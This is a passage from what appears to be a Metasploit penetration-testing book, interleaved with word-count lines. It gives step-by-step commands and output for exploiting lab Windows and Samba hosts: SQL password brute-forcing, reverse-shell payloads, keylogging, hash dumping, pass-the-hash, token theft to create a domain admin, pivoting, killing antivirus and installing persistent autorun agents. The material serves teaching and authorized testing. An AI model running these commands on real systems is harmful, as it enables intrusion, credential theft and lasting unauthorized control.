open one. If you look closely at X you will see that our attacker machine is 
bound to :1 (all ports) and that it finds a port outbound on port 1047 Y on 
the target network.
[Word Count: 67]

Resource files are script files that automate commands within msfconsole. They 
contain a list of commands that are executed from msfconsole and run sequen-
tially. Resource files can greatly reduce testing and development times, allow-
ing you to automate many repetitive tasks, including exploitation.
Resource files can be loaded from msfconsole with the resource command, or 
they can be passed as a command-line argument with the -r switch.
The simple example shown next creates a resource file that displays our 
Metasploit version and then loads the sounds plug-in:
[Word Count: 88]

root@bt:/opt/framework3/msf3/ echo version > resource.rc X
root@bt:/opt/framework3/msf3/ echo load sounds >> resource.rc Y
root@bt:/opt/framework3/msf3/ msfconsole -r resource.rc Z
[ resource (resource.rc)> version
Framework: 3.7.0-dev.12220
Console  : 3.7.0-dev.12220
resource (resource.rc)> load sounds
[*] Successfully loaded plugin: sounds
msf >
[Word Count: 38]

As you can see at X and Y, the version and load sounds commands are 
echoed into a text file called resource.rc. This file is then passed to msfconsole at 
the command line at Z with the -r switch, and when the file begins to load, the 
commands are executed at [ from the resource file.
[Word Count: 56]

A more complex resource file might automatically run a particular exploit 
against a machine in your lab environment. For example, the following listing 
uses an SMB exploit in a newly created resource file called autoexploit.rc. We 
set a payload and our attack and target IPs in this one file so that we don’t 
have to specify these options manually when attempting this exploit.
[Word Count: 63]

root@bt:/opt/framework3/msf3/ echo use exploit/windows/smb/ms08_067_netapi > autoexploit.rc
root@bt:/opt/framework3/msf3/ echo set RHOST 192.168.1.155 >> autoexploit.rc
root@bt:/opt/framework3/msf3/ echo set PAYLOAD windows/meterpreter/reverse_tcp >> autoexploit.rc
root@bt:/opt/framework3/msf3/ echo set LHOST 192.168.1.101 >> autoexploit.rc
root@bt:/opt/framework3/msf3/ echo exploit >> autoexploit.rc
root@bt:/opt/framework3/msf3/ msfconsole
msf > resource autoexploit.rc
resource (autoexploit.rc)X> use exploit/windows/smb/ms08_067_netapi
resource (autoexploit.rc)> set RHOST 192.168.1.155
RHOST => 192.168.1.155
resource (autoexploit.rc)> set PAYLOAD windows/meterpreter/reverse_tcp
PAYLOAD => windows/meterpreter/reverse_tcp
resource (autoexploit.rc)> set LHOST 192.168.1.101
LHOST => 192.168.1.101
resource (autoexploit.rc)> exploit
[Word Count: 69]

[*] Started reverse handler on 192.168.1.101:4444
[*] Triggering the vulnerability...
[*] Sending stage (747008 bytes)
[*] Meterpreter session 1 opened (192.168.1.101:4444 -> 192.168.1.155:1033)
[Word Count: 23]

Here we specify the resource file within msfconsole, and it automatically 
runs our specified commands as shown by the output displayed at X.
[Word Count: 23]

NOTE
These are just a couple of simple examples. In Chapter 12, you will learn how to use 
karma, a very large resource file.
[Word Count: 24]

Compromising a Windows XP Virtual Machine
[Word Count: 6]

Before we dive into the specifics of Meterpreter, we first need to compromise 
a system and get a Meterpreter shell.
[Word Count: 20]

We begin by identifying the services and ports running on the target by con-
ducting a port scan with nmap to find a port to exploit, as shown here:
[Word Count: 29]

msf > nmap -sT -A -P0 192.168.33.130 X
[*] exec: nmap -sT -A -P0 192.168.33.130
[Word Count: 15]

PORT     STATE SERVICE      VERSION
21/tcp   open  ftp          Microsoft ftpd [
25/tcp   open  smtp         Microsoft ESMTP 6.0.2600.2180 \
80/tcp   open  http         Microsoft IIS webserver 5.1 ]
|_html-title: Directory Listing Denied
135/tcp  open  msrpc        Microsoft Windows RPC
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds Microsoft Windows XP microsoft-ds
1025/tcp open  msrpc        Microsoft Windows RPC
1433/tcp open  ms-sql-s     Microsoft SQL Server 2005 9.00.1399; RTM Y
6646/tcp open  unknown
MAC Address: 00:0C:29:EA:26:7C (VMware)
Device type: general purpose
Running: Microsoft Windows XP|2003
OS details: Microsoft Windows XP Professional SP2 Z or Windows Server 2003
[Word Count: 88]

Nmap done: 1 IP address (1 host up) scanned in 37.58 seconds
[Word Count: 12]

In this example, we’ll attack port 1433, MS SQL, because this is often an 
entry point of weakness that can lead to a complete compromise and full 
administrative-level control over the target.
[Word Count: 32]

To begin, we identify the MS SQL installation, and then launch a MS SQL 
Server brute force attack to see if we can guess a password. By default, MS SQL 
is installed on TCP port 1433 and UDP port 1434, though newer versions 
allow for installation on a dynamically allocated port, which can be random-
ized. Luckily, port 1434 UDP (for which we did not scan) remains the same 
and can be queried to identify the dynamic port of the SQL server.
Here, we scan the system and see that MS SQL port 1434 UDP is open:
[Word Count: 97]

Nmap scan report for 192.168.33.130
Host is up (0.00033s latency).
PORT     STATE         SERVICE
1434/udp open         ms-sql-m Y
[Word Count: 17]

Nmap done: 1 IP address (1 host up) scanned in 0.46 seconds
msf >
[Word Count: 14]

msf > use scanner/mssql/mssql_ping
msf auxiliary(mssql_ping) > show options
[Word Count: 9]

Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   PASSWORD                   no        The password for the specified username
   RHOSTS                     yes       The target address range or CIDR identifier
   THREADS   1                yes       The number of concurrent threads
   USERNAME  sa               no        The username to authenticate as
[Word Count: 42]

msf auxiliary(mssql_ping) > set RHOSTS 192.168.33.1/24
RHOSTS => 192.168.33.1/24
msf auxiliary(mssql_ping) > set THREADS 20
THREADS => 20
msf auxiliary(mssql_ping) > exploit
[Word Count: 22]

[*] Scanned 040 of 256 hosts (015% complete)
[*] Scanned 052 of 256 hosts (020% complete)
[*] Scanned 080 of 256 hosts (031% complete)
[*] Scanned 115 of 256 hosts (044% complete)
[Word Count: 32]

[*] SQL Server information for 192.168.33.130: X
[*]    ServerName      = IHAZSECURITY Y
[*]    InstanceName    = SQLEXPRESS
[*]    IsClustered     = No
[*]    Version         = 9.00.1399.06 Z
[*]    tcp             = 1433 [
[*]    np              = \\IHAZSECURITY\pipe\MSSQL$SQLEXPRESS\sql\query
[*] Scanned 129 of 256 hosts (050% complete)
[Word Count: 42]

After calling the mssql_ping module with use scanner/mssql/mssql_ping 
and setting our options, we see that a SQL Server installation is found at 
192.168.33.130 X. The name of the server is IHAZSECURITY Y. Its version 
number 9.00.1399.06 shown at Z equates to SQL Server 2005 Express, and 
we know that it’s listening on TCP port 1433 [.
[Word Count: 56]

Next, we brute force the server with the Framework’s mssql_login module:
[Word Count: 11]

msf > use scanner/mssql/mssql_login X
msf auxiliary(mssql_login) > show options
[Word Count: 10]

Name              Current Setting  Required  Description
   ----              ---------------  --------  -----------
   BRUTEFORCE_SPEED  5                yes       How fast to bruteforce, from 0 to 5
   PASSWORD                           no        The password for the specified username
   PASS_FILE                          no        File containing passwords, one per line
   RHOSTS                             yes       The target address range or CIDR identifier
   RPORT             1433             yes       The target port
   THREADS           1                yes       The number of concurrent threads
   USERNAME          sa               no        The username to authenticate as
   USERPASS_FILE                      no        File containing users and passwords
separated by space, one pair per line
   USER_FILE                          no        File containing usernames, one per line
   VERBOSE           true             yes       Whether to print output for all attempts
[Word Count: 99]

msf auxiliary(mssql_login) > set PASS_FILE /pentest/exploits/fasttrack/bin/dict/wordlist.txt Y
PASS_FILE => /pentest/exploits/fasttrack/bin/dict/wordlist.txt
msf auxiliary(mssql_login) > set RHOSTS 192.168.33.130
RHOSTS => 192.168.33.130
msf auxiliary(mssql_login) > set THREADS 10
THREADS => 10
msf auxiliary(mssql_login) > set verbose false
verbose => false
msf auxiliary(mssql_login) > exploit
[+] 192.168.33.130:1433 - MSSQL - successful login 'sa' : 'password123'Z
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
[Word Count: 64]

We select the mssql_login module at X and point it to the default password 
word list from Fast-Track at Y. (We discuss Fast-Track in more detail in Chap-
ter 11.) At Z, we have successfully guessed the sa password: password123.
[Word Count: 40]

NOTE
Fast-Track is a tool created by one of the authors of this book that leverages multiple 
attacks, exploits, and the Metasploit Framework for payload delivery. One of Fast-
Track’s features is its ability to use a brute-forcer to attack and compromise MS SQL 
automatically.
[Word Count: 45]

msf > use windows/mssql/mssql_payload X
msf exploit(mssql_payload) > show options
[Word Count: 10]

Name          Current Setting  Required  Description
   ----          ---------------  --------  -----------
   PASSWORD                       no        The password for the specified username
   RHOST                          yes       The target address
   RPORT         1433             yes       The target port
   USERNAME      sa               no        The username to authenticate as
   UseCmdStager  true             no        Wait for user input before returning from exploit
   VERBOSE       false            no        Enable verbose output
[Word Count: 53]

Id  Name
   --  ----
   0   Automatic
msf exploit(mssql_payload) > set payload windows/meterpreter/reverse_tcp Y
payload => windows/meterpreter/reverse_tcp
msf exploit(mssql_payload) > set LHOST 192.168.33.129
LHOST => 192.168.33.129
[Word Count: 25]

msf exploit(mssql_payload) > set LPORT 443
LPORT => 443
msf exploit(mssql_payload) > set RHOST 192.168.33.130
RHOST => 192.168.33.130
msf exploit(mssql_payload) > set PASSWORD password123
PASSWORD => password123
msf exploit(mssql_payload) > exploit
[Word Count: 31]

[*] Started reverse handler on 192.168.33.129:443
[*] Command Stager progress - 2.78% done (1494/53679 bytes)
[*] Command Stager progress - 5.57% done (2988/53679 bytes)
[*] Command Stager progress - 8.35% done (4482/53679 bytes)
[Word Count: 33]

[*] Command Stager progress - 97.32% done (52239/53679 bytes)
[*] Sending stage (748032 bytes)
[*] Meterpreter session 1 opened (192.168.33.129:443 -> 192.168.33.130:1699)
meterpreter > Z
[Word Count: 25]

Having successfully compromised the target and gained a Meterpreter console 
on the system, we can glean more information with some basic Meterpreter 
commands. Use the help command at any point for more information on 
how to use Meterpreter.
[Word Count: 38]

Meterpreter’s screenshot command will export an image of the active user’s 
desktop and save it to the /opt/metasploit3/msf3/ directory, as shown in Figure 6-1.
[Word Count: 24]

meterpreter > screenshot
Screenshot saved to: /opt/metasploit3/msf3/yVHXaZar.jpeg
[Word Count: 7]

Desktop screen captures offer a great way to learn about a target system. 
For example, in Figure 6-1, we can see that McAfee antivirus software is 
installed and running, which means we’ll need to be cautious about what we 
upload to the system. (Chapter 7 discusses antivirus evasion in more detail.)
[Word Count: 51]

Figure 6-1: Meterpreter-captured screenshot
[Word Count: 4]

Another command we can specify is sysinfo, which will tell us the platform on 
which the system is running, as shown here:
[Word Count: 22]

meterpreter > sysinfo
Computer: IHAZSECURITY
OS      : Windows XP (Build 2600, Service Pack 2).
Arch    : x86
Language: en_US
[Word Count: 19]

As you can see, this system is running Windows XP Service Pack 2. Because 
SP2 is end of life, we can assume that we can find a ton of holes on this system.
[Word Count: 33]

Now we’ll grab the password hash values from this system, which can either 
be cracked or used in an attack. We’ll also start keystroke logging (recording 
keystrokes) on the remote system. But first, let’s list the running processes on 
the target system with the ps command.
[Word Count: 46]

PID   Name                 Arch  Session  User                          Path
 ---   ----                 ----  -------  ----                          ----
 0     [System Process]
 4     System               x86   0        NT AUTHORITY\SYSTEM
[Word Count: 21]

1476  spoolsv.exe          x86    0        NT AUTHORITY\SYSTEM           C:\WINDOWS\
system32\spoolsv.exe
 1668  explorer.exe Y     x86    0        IHAZSECURITY\Administrator    C:\WINDOWS\
Explorer.EXE
[Word Count: 16]

4032  notepad.exe         x86    0        IHAZSECURITY\Administrator    C:\WINDOWS\
system32\notepad.exe
[Word Count: 7]

meterpreter > migrate 1668 Z
[*] Migrating to 1668...
[*] Migration completed successfully.
meterpreter > run post/windows/capture/keylog_recorder [
[*] Executing module against V-MAC-XP
[*] Starting the keystroke sniffer...
[*] Keystrokes being saved in to /root/.msf3/loot/
20110324171334_default_192.168.1.195_host.windows.key_179703.txt
[*] Recording keystrokes...
[*] Saving last few keystrokes...
[Word Count: 44]

root@bt:~# cat /root/.msf3/loot/20110324171334_default_192.168.1.195_host.windows.key_179703.txt \
Keystroke log started at Thu Mar 24 17:13:34 -0600 2011
[Word Count: 14]

administrator password <Back>  <Back>  <Back>  <Back>  <Back>  <Back>  <Back>  <Tab> password123!!
[Word Count: 11]

Executing ps at X provides a list of running processes, including 
explorer.exe Y. At Z we issue the migrate command to move our session 
into the explorer.exe process space. Once that move is complete, we start the 
keylog_recorder module at [, stopping it after some time with CTRL-C, and 
finally, at \, in another terminal window, we dump the contents of the 
keystroke logger to see what we’ve caught.
[Word Count: 69]

In the preceding example, we grabbed password hashes by logging what a 
user typed. We can also use Meterpreter to obtain the usernames and pass-
word hashes on a local file system without the use of keyloggers.
[Word Count: 37]

a 7-character password instead of a 14-character one. In NTLM, regardless 
of the password size, password123456 would be stored as a hash value of 
password123456.
[Word Count: 25]

NOTE
We’re using a super complex password here that we would not be able to crack in a rea-
sonable amount of time. Our password is larger than the 14-character maximum that 
LM supports, so it has automatically converted itself to an NTLM-based hash value. 
Even with rainbow tables or a super powerful cracking machine, it would take a signif-
icant amount of time to crack these passwords.
[Word Count: 68]

In the following code, we extract a username and password hash for the 
Administrator user account with UID 500 (the Windows Administrator system 
default). The strings that follow Administrator:500 are two hashes of the 
Administrator password. This shows an example of a simple extract of a user-
name and password hashes. Shortly, we will extract our own username and 
password hashes from our Windows XP system.
[Word Count: 66]

Administrator:500:e52cac67419a9a22cbb699e2fdfcc59e X :30ef086423f916deec378aac42c4ef0c Y:::
[Word Count: 4]

The first hash at X is an LM hash, and the second at Y is an NTLM hash.
[Word Count: 18]

meterpreter > use priv
Loading extension priv...success.
meterpreter > run post/windows/gather/hashdump 
[*] Obtaining the boot key...
[*] Calculating the hboot key using SYSKEY 8528c78df7ff55040196a9b670f114b6...
[*] Obtaining the user list and keys...
[*] Decrypting user keys...
[*] Dumping password hashes...
Administrator:500:aad3b435b51404eeaad3b435b51404ee:b75989f65d1e04af7625ed712ac36c29:::
[Word Count: 40]

A hash value that starts with aad3b435 is simply an empty or 
null hash value—a placeholder for an empty string. (Something like 
Administrator:500:NOPASSWD:ntlmhash is also null.) Because our password
[Word Count: 29]

was longer than 14 characters, Windows can no longer store an LM hash, and 
it uses the standard aad3b435 . . . string, which represents a blank password.
[Word Count: 28]

In the preceding example, we ran into a slight complication: We have the 
administrator’s username and password hashes, but we can’t crack the pass-
word in a reasonable time frame. If we don’t know the password, how can we 
log into additional machines and potentially compromise more systems with 
this one user account?
We can use the pass-the-hash technique, which requires that we have only 
the password hash, not the password itself. Metasploit’s windows/smb/psexec 
module makes this all possible, as shown here:
[Word Count: 82]

msf> use windows/smb/psexec X
msf exploit(psexec)> set PAYLOAD windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
msf exploit(psexec)> set LHOST 192.168.33.129
LHOST => 192.168.33.129
msf exploit(psexec)> set LPORT 443
LPORT => 443
msf exploit(psexec)> set RHOST 192.168.33.130
RHOST => 192.168.33.130
[Word Count: 36]

msf exploit(psexec)> set SMBPass  
aad3b435b51404eeaad3b435b51404ee:b75989f65d1e04af7625ed712ac36c29 Y
SMBPass => aad3b435b51404eeaad3b435b51404ee:b75989f65d1e04af7625ed712ac36c29
msf exploit(psexec)> exploit
[*] Connecting to the server...
[*] Started reverse handler
[*] Authenticating as user 'Administrator'...
[Word Count: 26]

[*] Uploading payload...
[*] Created \JsOvAFLy.exe...
[Word Count: 6]

Now that we have access to the system, we can create a normal user account 
with limited permissions using the net user command. We’ll create a new 
user account to demonstrate how to elevate permissions as that user. (You 
will learn more about this in Chapter 8.)
When we compromise a limited user account, we will run into restric-
tions that prevent us from executing commands that require administrative-
level permissions. By elevating an account’s permissions, we overcome that 
restriction.
On a Windows XP target machine, we enter the following command:
[Word Count: 91]

C:\Documents and Settings\Administrator>net user bob password123 /add.
[Word Count: 7]

Next, we create a Meterpreter-based payload, payload.exe, copy it to the 
target’s XP machine, and run it under the user account bob. This will be our 
new limited user account. In this example, we will use msfpayload to create a 
Meterpreter-based payload as a normal Windows executable. (We’ll discuss 
msfpayload in more detail in Chapter 7.)
[Word Count: 56]

root@bt:/opt/framework3/msf3# msfpayload windows/meterpreter/reverse_tcp 
LHOST=192.168.33.129 LPORT=443 X > payload.exe X
root@bt:/opt/framework3/msf3# msfcli multi/handler PAYLOAD=windows/meterpreter/reverse_tcp 
LHOST=192.168.33.129 LPORT=443 E Y
[*] Please wait while we load the module tree...
[*] Started reverse handler on 192.168.33.129:443
[*] Starting the payload handler...
[*] Sending stage (748032 bytes)
[*] Meterpreter session 1 opened (192.168.33.129:443 -> 192.168.33.130:1056)
meterpreter > getuid Z
Server username: IHAZSECURITY\bob
[Word Count: 57]

meterpreter > shell X
Process 2896 created.
Channel 1 created.
Microsoft Windows XP [Version 5.1.2600]
(C) Copyright 1985-2001 Microsoft Corp.
C:\>net user bob
[Word Count: 23]

Local Group Memberships      *Users
Global Group memberships     *None
The command completed successfully.
C:\>^Z
Background channel 1? [y/N]  y
[Word Count: 18]

NOTE
Here’s another Meterpreter trick: While you’re in the Meterpreter console, enter background 
to jump back into msfconsole and leave the session running. Then enter sessions -l 
and sessions -i sessionid to return to your Meterpreter console.
[Word Count: 37]

Now let’s get administrative or SYSTEM rights. As shown in the next list-
ing, we enter use priv to load the priv extensions, which gets us access to the 
privileged module (which may already be loaded). Next, we enter getsystem 
in an attempt to elevate our privilege to that of local system, or administra-
tor. We then verify that we have admin privileges with the getuid command. 
The server username returned is NT AUTHORITY\SYSTEM, which tells us 
that we’ve succeeded at gaining administrator access.
[Word Count: 84]

meterpreter > use priv
Loading extension priv...success.
meterpreter > getsystem
...got system (via technique 4).
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
[Word Count: 22]

To switch back to the previous user account where we initially got our 
Meterpreter shell, we’d use rev2self.
[Word Count: 18]

For this example, we’ll use the Meterpreter function ps to list the applications 
running and show under which account they are running. We’ll use the 
domain name SNEAKS.IN X and the user account ihazdomainadmin Y.
[Word Count: 35]

PID   Name                 Arch  Session  User                          Path
 ---   ----                 ----  -------  ----                          ----
 0     [System Process]
 4     System               x86   0        NT AUTHORITY\SYSTEM
380   cmd.exe              x86   0 
XSNEAKS.IN\ihazdomainadminY
\System\
Root\System32\cmd.exe
[Word Count: 28]

As shown in the following listing, we leverage steal_token and the PID 
(380 in this case) to steal the token of that user and assume the role of the 
domain administrator:
[Word Count: 31]

meterpreter > steal_token 380
Stolen token with username: SNEAKS.IN\ihazdomainadmin
meterpreter >
[Word Count: 11]

meterpreter > use incognito
Loading extension incognito...success.
meterpreter > list_tokens -u
[-] Warning: Not currently running as SYSTEM, not all tokens will be available
             Call rev2self if primary process token is SYSTEM
[Word Count: 32]

Delegation Tokens Available
========================================
SNEAKS.IN\ihazdomainadmin X
IHAZSECURITY\Administrator
NT AUTHORITY\LOCAL SERVICE
NT AUTHORITY\NETWORK SERVICE
NT AUTHORITY\SYSTEM
[Word Count: 15]

Impersonation Tokens Available
========================================
NT AUTHORITY\ANONYMOUS LOGON
[Word Count: 7]

As shown in the next listing, we successfully impersonate the ihazdomainadmin 
token at X and add a user account at Y, which we then give domain admin-
istrator rights at Z. (Be sure to use two backslashes, \\, when entering the 
DOMAIN\USERNAME at X.) Our domain controller is 192.168.33.50.
[Word Count: 49]

meterpreter > impersonate_token SNEAKS.IN\\ihazdomainadmin X
[+] Delegation token available
[+] Successfully impersonated user SNEAKS.IN\ihazdomainadmin
meterpreter > add_user omgcompromised p@55w0rd! -h 192.168.33.50 Y
[*] Attempting to add user omgcompromised to host 192.168.33.50
[+] Successfully added user
meterpreter > add_group_user "Domain Admins" omgcompromised -h 192.168.33.50 Z
[*]   Attempting to add user omgcompromised to group Domain Admins on domain controller
192.168.33.50
[+] Successfully added user to group
[Word Count: 64]

When entering the add_user and add_group_user commands, be sure to 
specify the -h flag, which tells Incognito where to add the domain administra-
tor account. In this case, that would be the IP address of a domain controller. 
The implications for this attack are devastating: Essentially, the Kerberos 
token on any system that a domain administrator logs into can be assumed 
and used to access the entire domain. This means that every server on your 
network is your weakest link!
[Word Count: 80]

[*] Meterpreter session 1 opened (10.10.1.129:443 -> 192.168.33.130:1075)
[Word Count: 8]

meterpreter > run get_local_subnets X
Local subnet: 192.168.33.0/255.255.255.0
meterpreter > background Y
msf exploit(handler) > route add 192.168.33.0 255.255.255.0 1 Z
msf exploit(handler) > route print [
[Word Count: 27]

Active Routing Table
====================
[Word Count: 4]

Subnet             Netmask            Gateway
   ------             -------            -------
   192.168.33.0       255.255.255.0      Session 1 \
[Word Count: 11]

use msf exploit(handler) > use linux/samba/lsa_transnames_heap
msf exploit(lsa_transnames_heap) > set payload linux/x86/shell/reverse_tcp
payload => linux/x86/shell/reverse_tcp
msf exploit(lsa_transnames_heap) > set LHOST 10.10.1.129 X
LHOST => 10.10.1.129
msf exploit(lsa_transnames_heap) > set LPORT 8080
LPORT => 8080
msf exploit(lsa_transnames_heap) > set RHOST 192.168.33.132 Y
RHOST => 192.168.33.132
msf exploit(lsa_transnames_heap) > ifconfig Z
[*] exec: ifconfig
[Word Count: 52]

eth0      Link encap:Ethernet  HWaddr 00:0c:29:47:e6:79
          inet addr:10.10.1.129  Bcast:10.10.1.255  Mask:255.255.255.0
          inet6 addr: fe80::20c:29ff:fe47:e679/64 Scope:Link
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:23656 errors:0 dropped:0 overruns:0 frame:0
          TX packets:32321 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000
          RX bytes:4272582 (4.2 MB)  TX bytes:17849775 (17.8 MB)
          Interrupt:19 Base address:0x2000
[Word Count: 44]

lo        Link encap:Local Loopback
          inet addr:127.0.0.1  Mask:255.0.0.0
          inet6 addr: ::1/128 Scope:Host
          UP LOOPBACK RUNNING  MTU:16436  Metric:1
          RX packets:600 errors:0 dropped:0 overruns:0 frame:0
          TX packets:600 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:0
          RX bytes:41386 (41.3 KB)  TX bytes:41386 (41.3 KB)
[Word Count: 38]

msf exploit(lsa_transnames_heap) > exploit
[Word Count: 4]

[*] Started reverse handler on 10.10.1.129:8080
[*] Creating nop sled....
[*] Trying to exploit Samba with address 0xffffe410...
[*] Connecting to the SMB service...
[*] Binding to 12345778-1234-abcd-ef00-0123456789ab:0.0@ncacn_np:192.168.33.132[\lsarpc] ...
[*] Bound to 12345778-1234-abcd-ef00-0123456789ab:0.0@ncacn_np:192.168.33.132[\lsarpc] ...
[*] Calling the vulnerable function...
[Word Count: 39]

[+] Server did not respond, this is expected
[*] Trying to exploit Samba with address 0xffffe411...
[*] Connecting to the SMB service...
[*] Binding to 12345778-1234-abcd-ef00-0123456789ab:0.0@ncacn_np:192.168.33.132[\lsarpc] ...
[*] Bound to 12345778-1234-abcd-ef00-0123456789ab:0.0@ncacn_np:192.168.33.132[\lsarpc] ...
[*] Calling the vulnerable function...
[+] Server did not respond, this is expected
[*] Trying to exploit Samba with address 0xffffe412...
[*] Connecting to the SMB service...
[*] Binding to 12345778-1234-abcd-ef00-0123456789ab:0.0@ncacn_np:192.168.33.132[\lsarpc] ...
[*] Bound to 12345778-1234-abcd-ef00-0123456789ab:0.0@ncacn_np:192.168.33.132[\lsarpc] ...
[*] Calling the vulnerable function...
[*] Sending stage (36 bytes)
[*] Command shell session 1 opened (10.10.1.129:8080 -> 192.168.33.132:1608) [
[Word Count: 89]

NOTE
You could also use the scanner/portscan/tcp scanner to conduct a series of port 
scans through your compromised target on the local subnet itself. We won’t go into the 
details here, but just know that you can perform port scanning on a compromised net-
work leveraging this module.
[Word Count: 48]

In the preceding examples, we used the route add command after we had 
compromised the system. Alternatively, to add the routes automatically to 
Meterpreter upon a new session spawn, we could use load auto_add_route:
[Word Count: 34]

msf exploit(ms08_067_netapi) > load auto_add_route
[*] Successfully loaded plugin: auto_add_route
[Word Count: 10]

msf exploit(ms08_067_netapi) > exploit
[*] Started reverse handler on 10.10.1.129:443
[*] Triggering the vulnerability...
[*] Sending stage (748032 bytes)
[*] Meterpreter session 1 opened (10.10.1.129:443 -> 192.168.33.130:1090)
[*] AutoAddRoute: Routing new subnet 192.168.33.0/255.255.255.0 through session 1
[Word Count: 36]

Several external Meterpreter scripts can help you to enumerate a system or 
perform predefined tasks inside the Meterpreter shell. We won’t cover every 
script here, but we will mention a few of the most notable ones.
[Word Count: 36]

NOTE
The Meterpreter scripts are in the process of being moved to post exploitation modules. 
We’ll cover both scripts and post exploitation modules in this chapter.
[Word Count: 26]

meterpreter > run vnc
[*] Creating a VNC reverse tcp stager: LHOST=192.168.33.129 LPORT=4545)
[*] Running payload handler
[*] VNC stager executable 37888 bytes long
[*] Uploaded the VNC agent to C:\WINDOWS\TEMP\CTDWtQC.exe (must be deleted manually)
[*] Executing the VNC agent with endpoint 192.168.33.129:4545...
[*] VNC Server session 2 opened (192.168.33.129:4545 -> 192.168.33.130:1091)
[Word Count: 52]

This will give us a VNC graphical interface to the target machine and 
allow us to interact through a desktop.
[Word Count: 20]

meterpreter > run screen_unlock
[*] OS 'Windows XP (Build 2600, Service Pack 2).' found in known targets
[*] patching...
[*] done!
[Word Count: 21]

Often, when we are attacking a system and exploiting a service such as Inter-
net Explorer, if the target user closes the browser, the Meterpreter session 
is also closed and we lose our connection to the target. To avoid this prob-
lem, we can use the migrate post exploitation module, shown next, to attempt 
to migrate the service to a memory space that won’t close when the target 
closes the browser. By migrating to a different, more stable process, we ensure 
that the process isn’t closed and we maintain our connection to the system.
[Word Count: 94]

meterpreter > run post/windows/manage/migrate
[*] Running module against V-MAC-XP
[*] Current server process: revterp.exe (2436)
[Word Count: 15]

[*] Migrating to explorer.exe...
[*] Migrating into process ID 816
[*] New server process: Explorer.EXE (816)
[Word Count: 16]

Antivirus software can block certain tasks. During penetration tests, we have 
seen “smarter” antivirus or host-based intrusion prevention products block 
our ability to run certain attack vectors. In such cases, we can run the killav 
script to stop the processes preventing our tasks from running.
[Word Count: 45]

meterpreter > run killav
[*] Killing Antivirus services on the target...
[*] Killing off cmd.exe...
[*] Killing off cmd.exe...
[Word Count: 19]

Obtaining a copy of the system’s password hashes allows us to run pass-the-
hash attacks or to brute force the hash to reveal the plain-text password. We 
can obtain the password hashes with the run hashdump command:
[Word Count: 37]

meterpreter > run hashdump
[*] Obtaining the boot key...
[*] Calculating the hboot key using SYSKEY de4b35306c5f595438a2f78f768772d2...
[*] Obtaining the user list and keys...
[*] Decrypting user keys...
[*] Dumping password hashes...
[Word Count: 32]

Administrator:500:e52cac67419a9a224a3b108f3fa6cb6d:8846f7eaee8fb117ad06bdd830b7586c:::
[Word Count: 1]

To see all traffic on a target, we can run a packet recorder. Everything cap-
tured by packetrecorder is saved in the .pcap file format to be parsed with a 
tool such as Wireshark.
In this listing, we run the packetrecorder script with the -i 1 option, which 
specifies which interface we want to use to perform the packet captures:
[Word Count: 60]

meterpreter > run packetrecorder -i 1
[*] Starting Packet capture on interface 1
[*] Packet capture started
[Word Count: 17]

The scraper script enumerates just about everything you could ever want 
from a system. It will grab the usernames and passwords, download the entire 
registry, dump password hashes, gather system information, and export the 
HKEY_CURRENT_USER (HKCU).
[Word Count: 36]

meterpreter > run scraper
[*] New session on 192.168.33.130:1095...
[*] Gathering basic system information...
[*] Dumping password hashes...
[*] Obtaining the entire registry...
[*] Exporting HKCU
[*] Downloading HKCU (C:\WINDOWS\TEMP\XklepHOU.reg)
[Word Count: 30]

Meterpreter’s persistence script allows you to inject a Meterpreter agent to 
ensure that Meterpreter is running even after the target system reboots. If 
this is a reverse connection, you can set intervals for the target to connect 
back to the attacker machine. If it’s a bind, you can have it attempt to bind 
on an interface at a given time.
[Word Count: 60]

WARNING 
If you use this functionality, be sure that you remove it after you’re done. If you forget to 
do this, any attacker can also gain access to the system without authentication!
[Word Count: 32]

In the following listing, we run persistence and tell Windows to autostart 
the agent at boot time (-X), wait 50 seconds (-i 50) before connection retries, 
run on port 443 (-p 443), and connect to IP 192.168.33.129. We then estab-
lish a listener for the agent at X with use multi/handler, and after setting a 
couple of options and running exploit, we see at Z that the connection comes 
in as expected.
[Word Count: 72]

meterpreter > run persistence -X -i 50 -p 443 -r 192.168.33.129
[*] Creating a persistent agent: LHOST=192.168.33.129 LPORT=443 (interval=50 onboot=true)
[*] Persistent agent script is 316384 bytes long
[*] Uploaded the persistent agent to C:\WINDOWS\TEMP\asSnqrlUDRwO.vbs
[*] Agent executed with PID 3160
[*] Installing into autorun as HKLM\Software\Microsoft\Windows\CurrentVersion\Run\xEYnaHedooc Y
[*] Installed into autorun as HKLM\Software\Microsoft\Windows\CurrentVersion\Run\
xEYnaHedooc
msf> use multi/handler X
msf exploit(handler) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
msf exploit(handler) > set LPORT 443
LPORT => 443
msf exploit(handler) > set LHOST 192.168.33.129
LHOST => 192.168.33.129
msf exploit(handler) > exploit
[Word Count: 90]

[*] Started reverse handler on 192.168.33.129:443
[*] Starting the payload handler...
[*] Sending stage (748032 bytes)
[*] Meterpreter session 2 opened (192.168.33.129:443 -> 192.168.33.130:1120) Z
[Word Count: 25]

meterpreter > run post/windows/gather/hashdump
[*] Obtaining the boot key...
[*] Calculating the hboot key using SYSKEY de4b35306c5f595438a2f78f768772d2...
[*] Obtaining the user list and keys...
[*] Decrypting user keys...
[*] Dumping password hashes...
[Word Count: 32]

To see a list of post exploitation modules, enter the following and then 
press the TAB key on your keyboard at the end of the line:
[Word Count: 26]

Upgrading Your Command Shell to Meterpreter
[Word Count: 6]

One of the newer features in the Metasploit Framework is its ability to 
upgrade a command shell payload to a Meterpreter payload once the system 
has been exploited, by issuing the sessions -u command. This is useful if we 
use a command shell payload as an initial stager and then find that this newly 
exploited system would make the perfect launching pad for further attacks
[Word Count: 65]

into the network. Let’s look at a quick example from start to finish using 
MS08-067 with a reverse command shell as the payload, and upgrade it to a 
Meterpreter shell.
[Word Count: 30]

root@bt:/opt/framework3/msf3# msfconsole
msf > search ms08_067
[*] Searching loaded modules for pattern 'ms08_067'...
[Word Count: 13]

Name                         Rank   Description
   ----                         ----   -----------
   windows/smb/ms08_067_netapi  great  Microsoft Server Service Relative Path Stack
Corruption
[Word Count: 15]

